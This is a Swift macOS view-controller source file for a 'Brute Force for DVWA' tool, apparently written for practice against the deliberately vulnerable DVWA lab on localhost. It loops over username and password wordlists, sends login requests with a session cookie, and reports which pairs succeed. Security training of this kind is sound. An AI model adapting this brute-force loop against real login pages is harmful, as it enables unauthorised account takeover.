//
//  ViewController.swift
//  Brute Force for DVWA
//
//  Created by Леонид Лукашевич on 14.11.2021.
//

import Cocoa

class ViewController: NSViewController {
    
    @IBOutlet var textField: NSTextView!
    @IBOutlet weak var userNamesPath: NSTextField!
    @IBOutlet weak var passwordsPath: NSTextField!
    @IBOutlet weak var phpSessionID: NSTextField!
    @IBOutlet weak var onlyTrueChecked: NSButton!
    
    @IBAction func startBruteForce(_ sender: NSButton) {
        guard FileManager.default.fileExists(atPath: userNamesPath.stringValue),
              FileManager.default.fileExists(atPath: passwordsPath.stringValue)
        else {
            DispatchQueue.main.async {
                self.textField.string = "Error: The file was not found."
            }
            return
        }
        
        guard let userNames = try? String(contentsOfFile: userNamesPath.stringValue),
              let passwords = try? String(contentsOfFile: passwordsPath.stringValue)
        else {
            DispatchQueue.main.async {
                self.textField.string = "Error: The file can not be opened."
            }
            return
        }
        
        guard let url = URL(string: "http://localhost/dvwa/vulnerabilities/brute/?username=&password=&Login=Login") else { return }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.addValue("security=low; PHPSESSID=\(phpSessionID.stringValue)", forHTTPHeaderField: "Cookie")
        request.addValue("text/html", forHTTPHeaderField: "Content-Type")
        
        let session = URLSession.shared
        
        for user in userNames.split(separator: "\n") {
            for password in passwords.split(separator: "\n") {
                request.url = URL(string: "http://localhost/dvwa/vulnerabilities/brute/?username=\(user)&password=\(password)&Login=Login")
                
                session.dataTask(with: request) { data, response, error in
                    guard let data = data, let html = String(data: data, encoding: .utf8) else { return }

                    if !html.contains("incorrect") {
                        DispatchQueue.main.async {
                            self.textField.string += "\(user):\(password) - True\n"
                        }
                    } else {
                        DispatchQueue.main.async {
                            if self.onlyTrueChecked.state.rawValue == 0 {
                                self.textField.string += "\(user):\(password) - False\n"
                            }
                        }
                    }
                }.resume()
            }
        }
    }
}
